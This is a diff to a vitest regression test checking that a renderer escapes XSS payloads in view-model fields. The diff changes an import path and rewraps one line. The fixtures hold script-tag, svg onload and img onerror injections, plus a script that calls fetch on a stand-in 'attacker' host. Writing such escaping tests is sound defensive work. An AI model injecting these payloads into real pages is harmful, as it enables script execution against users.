@@ -1,5 +1,6 @@
 import { describe, it, expect } from 'vitest';
-import { renderHtmlTemplate, SubjectCardViewModel } from '@bangumi-agent-kit/renderer';
+import { SubjectCardViewModel } from '@bangumi-agent-kit/renderer';
+import { renderHtmlTemplate } from '../../packages/renderer/src/internal/index.js';
 
 describe('PR-5 Renderer XSS Regression (R08, R30)', () => {
   it('R08 & R30: Malicious script/DOM injection in ViewModel is escaped as pure text', () => {
@@ -11,7 +12,8 @@ describe('PR-5 Renderer XSS Regression (R08, R30)', () => {
         name: '<script>alert("xss-name")</script>',
         nameCn: '"><svg onload=alert(1)>',
         type: 'anime',
-        summary: '</style><script>alert("xss-summary")</script><img src="http://127.0.0.1/evil.jpg" onerror="alert(1)">',
+        summary:
+          '</style><script>alert("xss-summary")</script><img src="http://127.0.0.1/evil.jpg" onerror="alert(1)">',
         tags: ['"><svg onload=alert(1)>', '<script>fetch("http://attacker")</script>'],
       },
       source: { label: '"><script>alert(1)</script>' },
